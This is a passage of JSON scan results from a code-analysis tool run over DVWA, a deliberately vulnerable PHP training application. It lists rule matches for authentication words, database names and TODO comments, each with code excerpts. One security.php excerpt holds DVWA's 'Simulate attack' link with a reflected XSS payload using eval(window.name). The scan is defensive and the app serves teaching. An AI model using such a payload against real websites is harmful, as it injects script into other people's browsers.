        "fileName": "/home/dev/tools/DVWA/about.php",
        "ruleId": "AI001200",
        "ruleName": "Cloud Service: Code Repository (GitHub)",
        "ruleDescription": "Cloud Service: Code Repository (GitHub)",
        "pattern": "\\b(github)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Metadata.CloudServices.Code.Repo.GitHub"
        ],
        "sample": "github",
        "excerpt": "\t\t&lt;li&gt;Tom Mackenzie: &quot; . dvwaExternalLinkUrlGet( &#39;https://www.tmacuk.co.uk/&#39;,&#39;www.tmacuk.co.uk&#39; ) . &quot;&lt;/li&gt;\n\t&lt;/ul&gt;\n\t&lt;ul&gt;\n\t\t&lt;li&gt;PHPIDS - Copyright (c) 2007 &quot; . dvwaExternalLinkUrlGet( &#39;http://github.com/PHPIDS/PHPIDS&#39;, &#39;PHPIDS group&#39; ) . &quot;&lt;/li&gt;\n\t&lt;/ul&gt;\n\n\t&lt;h2&gt;License&lt;/h2&gt;\n\t&lt;p&gt;Damn Vulnerable Web Application (DVWA) is free software: you can redistribute it and/or modify\n\tit under the terms of the GNU General Public License as published by\n",
        "startLocationLine": 43,
        "startLocationColumn": 71,
        "endLocationLine": 43,
        "endLocationColumn": 77
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/about.php",
        "ruleId": "AI011610",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "\\b(mysql)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "MySQL",
        "excerpt": "&lt;div class=\\&quot;body_padded\\&quot;&gt;\n\t&lt;h2&gt;About&lt;/h2&gt;\n\t&lt;p&gt;Version &quot; . dvwaVersionGet() . &quot; (Release date: &quot; . dvwaReleaseDateGet() . &quot;)&lt;/p&gt;\n\t&lt;p&gt;Damn Vulnerable Web Application (DVWA) is a PHP/MySQL web application that is damn vulnerable. Its main goals are to be an aid for security professionals to test their skills and tools in a legal environment, help web developers better understand the processes of securing web applications and aid teachers/students to teach/learn web application security in a class room environment&lt;/p&gt;\n\t&lt;p&gt;The official documentation for DVWA can be found &lt;a href=\\&quot;docs/DVWA_v1.3.pdf\\&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;\n\t&lt;p&gt;All material is copyright 2008-2015 RandomStorm &amp; Ryan Dewhurst.&lt;/p&gt;\n\n\t&lt;h2&gt;Links&lt;/h2&gt;\n\t&lt;ul&gt;\n",
        "startLocationLine": 16,
        "startLocationColumn": 53,
        "endLocationLine": 16,
        "endLocationColumn": 58
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/ids_log.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "authenticated",
        "excerpt": "define( &#39;DVWA_WEB_ROOT_TO_PHPIDS_LOG&#39;, &#39;external/phpids/&#39; . dvwaPhpIdsVersionGet() . &#39;/lib/IDS/tmp/phpids_log.txt&#39; );\ndefine( &#39;DVWA_WEB_PAGE_TO_PHPIDS_LOG&#39;, DVWA_WEB_PAGE_TO_ROOT.DVWA_WEB_ROOT_TO_PHPIDS_LOG );\n\ndvwaPageStartup( array( &#39;authenticated&#39;, &#39;phpids&#39; ) );\n\n$page = dvwaPageNewGrab();\n$page[ &#39;title&#39; ]   = &#39;PHPIDS Log&#39; . $page[ &#39;title_separator&#39; ].$page[ &#39;title&#39; ];\n$page[ &#39;page_id&#39; ] = &#39;log&#39;;\n// $page[ &#39;clear_log&#39; ]; &lt;- Was showing error.\n",
        "startLocationLine": 9,
        "startLocationColumn": 26,
        "endLocationLine": 9,
        "endLocationColumn": 39
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/phpinfo.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "authenticated",
        "excerpt": "define( &#39;DVWA_WEB_PAGE_TO_ROOT&#39;, &#39;&#39; );\nrequire_once DVWA_WEB_PAGE_TO_ROOT . &#39;dvwa/includes/dvwaPage.inc.php&#39;;\n\ndvwaPageStartup( array( &#39;authenticated&#39;, &#39;phpids&#39; ) );\n\nphpinfo();\n\n?&gt;\n\n",
        "startLocationLine": 6,
        "startLocationColumn": 26,
        "endLocationLine": 6,
        "endLocationColumn": 39
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/logout.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "login",
        "excerpt": "\nif( !dvwaIsLoggedIn() ) {\t// The user shouldn&#39;t even be on this page\n\t// dvwaMessagePush( &quot;You were not logged in&quot; );\n\tdvwaRedirect( &#39;login.php&#39; );\n}\n\ndvwaLogout();\ndvwaMessagePush( &quot;You have logged out&quot; );\ndvwaRedirect( &#39;login.php&#39; );\n",
        "startLocationLine": 10,
        "startLocationColumn": 17,
        "endLocationLine": 10,
        "endLocationColumn": 22
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/logout.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "login",
        "excerpt": "\ndvwaLogout();\ndvwaMessagePush( &quot;You have logged out&quot; );\ndvwaRedirect( &#39;login.php&#39; );\n\n?&gt;\n\n",
        "startLocationLine": 15,
        "startLocationColumn": 16,
        "endLocationLine": 15,
        "endLocationColumn": 21
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/security.php",
        "ruleId": "AI036700",
        "ruleName": "OS: Multiprocessing / Multithreading",
        "ruleDescription": "OS: Multiprocessing / Multithreading",
        "pattern": "\\b(mutex|semaphore|thread|lock|fork)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "OS.Process.Multiprocessing"
        ],
        "sample": "lock",
        "excerpt": "\n$page[ &#39;body&#39; ] .= &quot;\n&lt;div class=\\&quot;body_padded\\&quot;&gt;\n\t&lt;h1&gt;DVWA Security &lt;img src=\\&quot;&quot; . DVWA_WEB_PAGE_TO_ROOT . &quot;dvwa/images/lock.png\\&quot; /&gt;&lt;/h1&gt;\n\t&lt;br /&gt;\n\n\t&lt;h2&gt;Security Level&lt;/h2&gt;\n\n\t{$securityHtml}\n",
        "startLocationLine": 86,
        "startLocationColumn": 72,
        "endLocationLine": 86,
        "endLocationColumn": 76
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/security.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "authenticated",
        "excerpt": "define( &#39;DVWA_WEB_PAGE_TO_ROOT&#39;, &#39;&#39; );\nrequire_once DVWA_WEB_PAGE_TO_ROOT . &#39;dvwa/includes/dvwaPage.inc.php&#39;;\n\ndvwaPageStartup( array( &#39;authenticated&#39;, &#39;phpids&#39; ) );\n\n$page = dvwaPageNewGrab();\n$page[ &#39;title&#39; ]   = &#39;DVWA Security&#39; . $page[ &#39;title_separator&#39; ].$page[ &#39;title&#39; ];\n$page[ &#39;page_id&#39; ] = &#39;security&#39;;\n\n",
        "startLocationLine": 6,
        "startLocationColumn": 26,
        "endLocationLine": 6,
        "endLocationColumn": 39
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/security.php",
        "ruleId": "AI001200",
        "ruleName": "Cloud Service: Code Repository (GitHub)",
        "ruleDescription": "Cloud Service: Code Repository (GitHub)",
        "pattern": "\\b(github)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Metadata.CloudServices.Code.Repo.GitHub"
        ],
        "sample": "github",
        "excerpt": "\n\t&lt;h2&gt;PHPIDS&lt;/h2&gt;\n\t{$WarningHtml}\n\t&lt;p&gt;&quot; . dvwaExternalLinkUrlGet( &#39;https://github.com/PHPIDS/PHPIDS&#39;, &#39;PHPIDS&#39; ) . &quot; v&quot; . dvwaPhpIdsVersionGet() . &quot; (PHP-Intrusion Detection System) is a security layer for PHP based web applications.&lt;/p&gt;\n\t&lt;p&gt;PHPIDS works by filtering any user supplied input against a blacklist of potentially malicious code. It is used in DVWA to serve as a live example of how Web Application Firewalls (WAFs) can help improve security and in some cases how WAFs can be circumvented.&lt;/p&gt;\n\t&lt;p&gt;You can enable PHPIDS across this site for the duration of your session.&lt;/p&gt;\n\n\t&lt;p&gt;{$phpIdsHtml}&lt;/p&gt;\n\t[&lt;a href=\\&quot;?test=%22&gt;&lt;script&gt;eval(window.name)&lt;/script&gt;\\&quot;&gt;Simulate attack&lt;/a&gt;] -\n",
        "startLocationLine": 116,
        "startLocationColumn": 42,
        "endLocationLine": 116,
        "endLocationColumn": 48
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/index.php",
        "ruleId": "AI027400",
        "ruleName": "Hygiene: Fix Comment",
        "ruleDescription": "Hygiene: Fix Comment",
        "pattern": "fixme|broke|broken",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Moderate",
        "tags": [
          "Miscellaneous.CodeHygiene.Comment.Fix"
        ],
        "sample": "Broke",
        "excerpt": "\t&lt;ul&gt;\n\t\t&lt;li&gt;&quot; . dvwaExternalLinkUrlGet( &#39;http://www.itsecgames.com/&#39;, &#39;bWAPP&#39;) . &quot;&lt;/li&gt;\n\t\t&lt;li&gt;&quot; . dvwaExternalLinkUrlGet( &#39;http://sourceforge.net/projects/mutillidae/files/mutillidae-project/&#39;, &#39;NOWASP&#39;) . &quot; (formerly known as &quot; . dvwaExternalLinkUrlGet( &#39;http://www.irongeek.com/i.php?page=mutillidae/mutillidae-deliberately-vulnerable-php-owasp-top-10&#39;, &#39;Mutillidae&#39; ) . &quot;)&lt;/li&gt;\n\t\t&lt;li&gt;&quot; . dvwaExternalLinkUrlGet( &#39;https://www.owasp.org/index.php/OWASP_Broken_Web_Applications_Project&#39;, &#39;OWASP Broken Web Applications Project\n&#39;) . &quot;&lt;/li&gt;\n\t&lt;/ul&gt;\n\t&lt;hr /&gt;\n\t&lt;br /&gt;\n&lt;/div&gt;&quot;;\n",
        "startLocationLine": 41,
        "startLocationColumn": 74,
        "endLocationLine": 41,
        "endLocationColumn": 79
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/index.php",
        "ruleId": "AI027400",
        "ruleName": "Hygiene: Fix Comment",
        "ruleDescription": "Hygiene: Fix Comment",
        "pattern": "fixme|broke|broken",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Moderate",
        "tags": [
          "Miscellaneous.CodeHygiene.Comment.Fix"
        ],
        "sample": "Broke",
        "excerpt": "\t&lt;ul&gt;\n\t\t&lt;li&gt;&quot; . dvwaExternalLinkUrlGet( &#39;http://www.itsecgames.com/&#39;, &#39;bWAPP&#39;) . &quot;&lt;/li&gt;\n\t\t&lt;li&gt;&quot; . dvwaExternalLinkUrlGet( &#39;http://sourceforge.net/projects/mutillidae/files/mutillidae-project/&#39;, &#39;NOWASP&#39;) . &quot; (formerly known as &quot; . dvwaExternalLinkUrlGet( &#39;http://www.irongeek.com/i.php?page=mutillidae/mutillidae-deliberately-vulnerable-php-owasp-top-10&#39;, &#39;Mutillidae&#39; ) . &quot;)&lt;/li&gt;\n\t\t&lt;li&gt;&quot; . dvwaExternalLinkUrlGet( &#39;https://www.owasp.org/index.php/OWASP_Broken_Web_Applications_Project&#39;, &#39;OWASP Broken Web Applications Project\n&#39;) . &quot;&lt;/li&gt;\n\t&lt;/ul&gt;\n\t&lt;hr /&gt;\n\t&lt;br /&gt;\n&lt;/div&gt;&quot;;\n",
        "startLocationLine": 41,
        "startLocationColumn": 115,
        "endLocationLine": 41,
        "endLocationColumn": 120
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/index.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "authenticated",
        "excerpt": "define( &#39;DVWA_WEB_PAGE_TO_ROOT&#39;, &#39;&#39; );\nrequire_once DVWA_WEB_PAGE_TO_ROOT . &#39;dvwa/includes/dvwaPage.inc.php&#39;;\n\ndvwaPageStartup( array( &#39;authenticated&#39;, &#39;phpids&#39; ) );\n\n$page = dvwaPageNewGrab();\n$page[ &#39;title&#39; ]   = &#39;Welcome&#39; . $page[ &#39;title_separator&#39; ].$page[ &#39;title&#39; ];\n$page[ &#39;page_id&#39; ] = &#39;home&#39;;\n\n",
        "startLocationLine": 6,
        "startLocationColumn": 26,
        "endLocationLine": 6,
        "endLocationColumn": 39
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/index.php",
        "ruleId": "AI001500",
        "ruleName": "Cloud Service: Code Repository (SourceForge)",
        "ruleDescription": "Cloud Service: Code Repository (SourceForge)",
        "pattern": "\\b(sourceforge)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Metadata.CloudServices.Code.Repo.SourceForge"
        ],
        "sample": "sourceforge",
        "excerpt": "\t&lt;p&gt;DVWA aims to cover the most commonly seen vulnerabilities found in today&#39;s web applications. However there are plenty of other issues with web applications. Should you wish to explore any additional attack vectors, or want more difficult challenges, you may wish to look into the following other projects:&lt;/p&gt;\n\t&lt;ul&gt;\n\t\t&lt;li&gt;&quot; . dvwaExternalLinkUrlGet( &#39;http://www.itsecgames.com/&#39;, &#39;bWAPP&#39;) . &quot;&lt;/li&gt;\n\t\t&lt;li&gt;&quot; . dvwaExternalLinkUrlGet( &#39;http://sourceforge.net/projects/mutillidae/files/mutillidae-project/&#39;, &#39;NOWASP&#39;) . &quot; (formerly known as &quot; . dvwaExternalLinkUrlGet( &#39;http://www.irongeek.com/i.php?page=mutillidae/mutillidae-deliberately-vulnerable-php-owasp-top-10&#39;, &#39;Mutillidae&#39; ) . &quot;)&lt;/li&gt;\n\t\t&lt;li&gt;&quot; . dvwaExternalLinkUrlGet( &#39;https://www.owasp.org/index.php/OWASP_Broken_Web_Applications_Project&#39;, &#39;OWASP Broken Web Applications Project\n&#39;) . &quot;&lt;/li&gt;\n\t&lt;/ul&gt;\n\t&lt;hr /&gt;\n\t&lt;br /&gt;\n",
        "startLocationLine": 40,
        "startLocationColumn": 43,
        "endLocationLine": 40,
        "endLocationColumn": 54
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/index.php",
        "ruleId": "AI011610",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "\\b(mysql)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "MySQL",
        "excerpt": "$page[ &#39;body&#39; ] .= &quot;\n&lt;div class=\\&quot;body_padded\\&quot;&gt;\n\t&lt;h1&gt;Welcome to Damn Vulnerable Web Application!&lt;/h1&gt;\n\t&lt;p&gt;Damn Vulnerable Web Application (DVWA) is a PHP/MySQL web application that is damn vulnerable. Its main goal is to be an aid for security professionals to test their skills and tools in a legal environment, help web developers better understand the processes of securing web applications and to aid both students &amp; teachers to learn about web application security in a controlled class room environment.&lt;/p&gt;\n\t&lt;p&gt;The aim of DVWA is to &lt;em&gt;practice some of the most common web vulnerabilities&lt;/em&gt;, with &lt;em&gt;various levels of difficultly&lt;/em&gt;, with a simple straightforward interface.&lt;/p&gt;\n\t&lt;hr /&gt;\n\t&lt;br /&gt;\n\n\t&lt;h2&gt;General Instructions&lt;/h2&gt;\n",
        "startLocationLine": 15,
        "startLocationColumn": 53,
        "endLocationLine": 15,
        "endLocationColumn": 58
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/login.php",
        "ruleId": "AI027300",
        "ruleName": "Hygiene: Todo Comment",
        "ruleDescription": "Hygiene: Todo Comment",
        "pattern": "todo",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Moderate",
        "tags": [
          "Miscellaneous.CodeHygiene.Comment.Todo"
        ],
        "sample": "TODO",
        "excerpt": "$messagesHtml = messagesPopAllToHtml();\n\nHeader( &#39;Cache-Control: no-cache, must-revalidate&#39;);    // HTTP/1.1\nHeader( &#39;Content-Type: text/html;charset=utf-8&#39; );      // TODO- proper XHTML headers...\nHeader( &#39;Expires: Tue, 23 Jun 2009 12:00:00 GMT&#39; );     // Date in the past\n\n// Anti-CSRF\ngenerateSessionToken();\n\n",
        "startLocationLine": 55,
        "startLocationColumn": 60,
        "endLocationLine": 55,
        "endLocationColumn": 64
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/login.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "Login",
        "excerpt": "\ndvwaDatabaseConnect();\n\nif( isset( $_POST[ &#39;Login&#39; ] ) ) {\n\t// Anti-CSRF\n\tif (array_key_exists (&quot;session_token&quot;, $_SESSION)) {\n\t\t$session_token = $_SESSION[ &#39;session_token&#39; ];\n\t} else {\n\t\t$session_token = &quot;&quot;;\n",
        "startLocationLine": 10,
        "startLocationColumn": 21,
        "endLocationLine": 10,
        "endLocationColumn": 26
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/login.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "login",
        "excerpt": "\t\t$session_token = &quot;&quot;;\n\t}\n\n\tcheckToken( $_REQUEST[ &#39;user_token&#39; ], $session_token, &#39;login.php&#39; );\n\n\t$user = $_POST[ &#39;username&#39; ];\n\t$user = stripslashes( $user );\n\t$user = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $user ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));\n\n",
        "startLocationLine": 18,
        "startLocationColumn": 58,
        "endLocationLine": 18,
        "endLocationColumn": 63
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/login.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "Login",
        "excerpt": "\t}\n\n\t// Login failed\n\tdvwaMessagePush( &#39;Login failed&#39; );\n\tdvwaRedirect( &#39;login.php&#39; );\n}\n\n$messagesHtml = messagesPopAllToHtml();\n\n",
        "startLocationLine": 48,
        "startLocationColumn": 20,
        "endLocationLine": 48,
        "endLocationColumn": 25
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/login.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "login",
        "excerpt": "\n\t// Login failed\n\tdvwaMessagePush( &#39;Login failed&#39; );\n\tdvwaRedirect( &#39;login.php&#39; );\n}\n\n$messagesHtml = messagesPopAllToHtml();\n\nHeader( &#39;Cache-Control: no-cache, must-revalidate&#39;);    // HTTP/1.1\n",
        "startLocationLine": 49,
        "startLocationColumn": 17,
        "endLocationLine": 49,
        "endLocationColumn": 22
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/login.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "Login",
        "excerpt": "\n\t\t&lt;meta http-equiv=\\&quot;Content-Type\\&quot; content=\\&quot;text/html; charset=UTF-8\\&quot; /&gt;\n\n\t\t&lt;title&gt;Login :: Damn Vulnerable Web Application (DVWA) v&quot; . dvwaVersionGet() . &quot;&lt;/title&gt;\n\n\t\t&lt;link rel=\\&quot;stylesheet\\&quot; type=\\&quot;text/css\\&quot; href=\\&quot;&quot; . DVWA_WEB_PAGE_TO_ROOT . &quot;dvwa/css/login.css\\&quot; /&gt;\n\n\t&lt;/head&gt;\n\n",
        "startLocationLine": 70,
        "startLocationColumn": 10,
        "endLocationLine": 70,
        "endLocationColumn": 15
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/login.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "login",
        "excerpt": "\n\t\t&lt;title&gt;Login :: Damn Vulnerable Web Application (DVWA) v&quot; . dvwaVersionGet() . &quot;&lt;/title&gt;\n\n\t\t&lt;link rel=\\&quot;stylesheet\\&quot; type=\\&quot;text/css\\&quot; href=\\&quot;&quot; . DVWA_WEB_PAGE_TO_ROOT . &quot;dvwa/css/login.css\\&quot; /&gt;\n\n\t&lt;/head&gt;\n\n\t&lt;body&gt;\n\n",
        "startLocationLine": 72,
        "startLocationColumn": 91,
        "endLocationLine": 72,
        "endLocationColumn": 96
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/login.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "login",
        "excerpt": "\n\t&lt;div id=\\&quot;content\\&quot;&gt;\n\n\t&lt;form action=\\&quot;login.php\\&quot; method=\\&quot;post\\&quot;&gt;\n\n\t&lt;fieldset&gt;\n\n\t\t\t&lt;label for=\\&quot;user\\&quot;&gt;Username&lt;/label&gt; &lt;input type=\\&quot;text\\&quot; class=\\&quot;loginInput\\&quot; size=\\&quot;20\\&quot; name=\\&quot;username\\&quot;&gt;&lt;br /&gt;\n\n",
        "startLocationLine": 92,
        "startLocationColumn": 17,
        "endLocationLine": 92,
        "endLocationColumn": 22
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/login.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "Login",
        "excerpt": "\n\t\t\t&lt;br /&gt;\n\n\t\t\t&lt;p class=\\&quot;submit\\&quot;&gt;&lt;input type=\\&quot;submit\\&quot; value=\\&quot;Login\\&quot; name=\\&quot;Login\\&quot;&gt;&lt;/p&gt;\n\n\t&lt;/fieldset&gt;\n\n\t&quot; . tokenField() . &quot;\n\n",
        "startLocationLine": 103,
        "startLocationColumn": 55,
        "endLocationLine": 103,
        "endLocationColumn": 60
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/login.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "Login",
        "excerpt": "\n\t\t\t&lt;br /&gt;\n\n\t\t\t&lt;p class=\\&quot;submit\\&quot;&gt;&lt;input type=\\&quot;submit\\&quot; value=\\&quot;Login\\&quot; name=\\&quot;Login\\&quot;&gt;&lt;/p&gt;\n\n\t&lt;/fieldset&gt;\n\n\t&quot; . tokenField() . &quot;\n\n",
        "startLocationLine": 103,
        "startLocationColumn": 70,
        "endLocationLine": 103,
        "endLocationColumn": 75
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/login.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "username",
        "excerpt": "\n\tcheckToken( $_REQUEST[ &#39;user_token&#39; ], $session_token, &#39;login.php&#39; );\n\n\t$user = $_POST[ &#39;username&#39; ];\n\t$user = stripslashes( $user );\n\t$user = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $user ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));\n\n\t$pass = $_POST[ &#39;password&#39; ];\n\t$pass = stripslashes( $pass );\n",
        "startLocationLine": 20,
        "startLocationColumn": 19,
        "endLocationLine": 20,
        "endLocationColumn": 27
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/login.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
